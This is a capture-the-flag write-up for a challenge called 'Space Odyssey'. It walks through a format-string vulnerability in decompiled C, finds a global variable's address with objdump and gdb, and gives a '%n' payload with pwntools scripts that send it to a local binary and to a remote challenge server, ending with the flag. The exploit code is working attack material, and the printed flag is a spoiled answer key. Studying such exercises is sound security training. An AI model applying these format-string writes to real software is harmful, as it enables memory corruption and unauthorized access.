# Space Odyssey

## Finding the vulnerability

Using Ghidra gives this code [from here](https://dogbolt.org/?id=58cbfe30-fbfc-4ee3-9dfd-fff8afc6ff67#Ghidra=207&Hex-Rays=217):

```
int main(void)
{
  char A [100];
  void *local_10;

  local_10 = &stack0x00000004;
  puts("Space Odyssey: Lost in the Cosmos");
  puts("Please enter the access code to regain control of the starship.");
  fflush(_stdout);
  fgets(A,100,_stdin);
  puts("Analyzing access code...");
  printf("Access code: ");
  printf(A);
  printf("Security Key Status: %d%% complete\n",key);
  if (key == 100) {
    puts("Access granted. Starship control restored.");
    puts(
        "Congratulations, space explorer! You\'ve saved the day but the flag is on server hehehehe!! \n               }"
        );
    puts("ver hehehehe!! \n               }");
  }
  else {
    puts("Access denied. Unauthorized intruders will not prevail.");
    puts("You\'re our last hope, find the correct access code!");
  }
  return 0;
}
```
The vulnerability is at "printf(A)" that allows us to input a format string.

Giving '%100c%10$naa\<location of key\>' as input, Allowes us to write the value 100 at location of key.

Explaination for this type of attack can be found [here](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

## Finding the address of key

An objdump of sa2 produces following assembly for the line printf("Security Key Status: %d%% complete\n", key):

```
    080491f6 <main>:
     8049299: add    esp,0x10
     804929c: mov    eax,DWORD PTR [ebx+0x2c]
     80492a2: sub    esp,0x8
     80492a5: push   eax
     80492a6: lea    eax,[ebx-0x1f6c]
     80492ac: push   eax
     80492ad: call   8049090 <printf@plt>
```

Following the cdecl calling convention, **&key = ebx + 0x2c**.

Setting a breakpoint at 80492ad(the printf call) in gdb and running "info registers ebx" gives ebx = 0x804c000.
So **&key = 0x804c02c**

## Sending input

Knowing the value of key along we the input string as '%100c%10$naa\x2c\xc0\x04\x08'(the address is written in reverse byte order since the code seems to be running in a x86 machine).

We can send the input to executable(while preserving the non-printable charecters) using [pwntools](https://docs.pwntools.com/en/stable/fmtstr.html).

```
    from pwn import *

    p = process('./sa2')

    p.sendline('%100c%10$naa' + '\x2c' + '\xc0' + '\x04' + '\x08')
    print(p.recvall()) # prints the output of the program

    p.close()
```
To send this input to the kludge server to get the flag:
```
    from pwn import *

    p = remote('milanctf.kludge.in',11419)

    p.sendline('%100c%10$naa' + '\x2c' + '\xc0' + '\x04' + '\x08')
    print(p.recvall()) # prints the output of the program

    p.close()
```

Flag: milanCTF{F0rm@t_Str1ng_1n_Sp4c3}
